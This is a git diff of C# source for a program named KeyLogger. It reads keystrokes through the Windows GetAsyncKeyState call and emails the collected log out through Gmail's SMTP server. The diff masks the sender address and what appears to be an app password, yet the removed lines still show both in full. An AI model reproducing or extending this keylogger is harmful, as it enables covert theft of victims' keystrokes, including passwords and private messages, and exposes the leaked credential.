@@ -14,7 +14,7 @@ namespace KeyLogger
     class Program
     {
         [DllImport("User32.dll")]
-        public static extern short GetAsyncKeyState(int i); // "short" ve doğru fonksiyon ismi
+        public static extern short GetAsyncKeyState(int i); 
         static long numberOfKeysyrokes = 0;
         private static string folderName;
 
@@ -97,12 +97,12 @@ namespace KeyLogger
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage mailMesaj = new MailMessage();
 
-            mailMesaj.From = new MailAddress("kerem44selcuk@gmail.com");
-            mailMesaj.To.Add("kerem44selcuk@gmail.com");
+            mailMesaj.From = new MailAddress("kerem**selcuk@gmail.com");
+            mailMesaj.To.Add("kerem**selcuk@gmail.com");
             mailMesaj.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl= true;
-            client.Credentials = new NetworkCredential("kerem44selcuk@gmail.com" , "srvh egwt qwus drdo");
+            client.Credentials = new NetworkCredential("kerem**selcuk@gmail.com" , "**** egwt **** drdo");//Şirefre gizlendi
             mailMesaj.Body = emailBody;
 
             client.Send(mailMesaj);
@@ -110,4 +110,5 @@ namespace KeyLogger
         }
     }
 }
+
 
